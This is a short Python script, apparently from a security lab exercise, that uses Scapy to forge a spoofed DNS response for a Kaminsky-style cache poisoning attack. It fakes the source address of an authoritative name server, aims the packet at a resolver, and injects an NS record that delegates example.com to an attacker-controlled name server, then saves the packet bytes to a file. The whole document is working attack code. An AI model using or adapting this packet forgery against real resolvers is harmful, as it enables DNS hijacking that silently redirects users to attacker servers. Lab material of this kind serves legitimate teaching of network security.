#!/usr/bin/env python3
from scapy.all import*
targetName='aaaaa.example.com'
targetDomain = 'example.com'
attackerNS = 'ns.attacker32.com'
dstIP='10.9.0.53'
srcIP='199.43.135.53'
ip = IP(dst=dstIP, src=srcIP)
udp = UDP(dport=33333, sport=53, chksum=0)

Qdsec = DNSQR(qname=targetName)
Anssec = DNSRR(rrname=targetName, type='A', rdata='1.1.1.1', ttl=259200)
NSsec = DNSRR(rrname=targetDomain, type='NS', rdata=attackerNS, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)

reply = ip/udp/dns
with open('ip_resp.bin','wb') as f:
    f.write(bytes(reply))

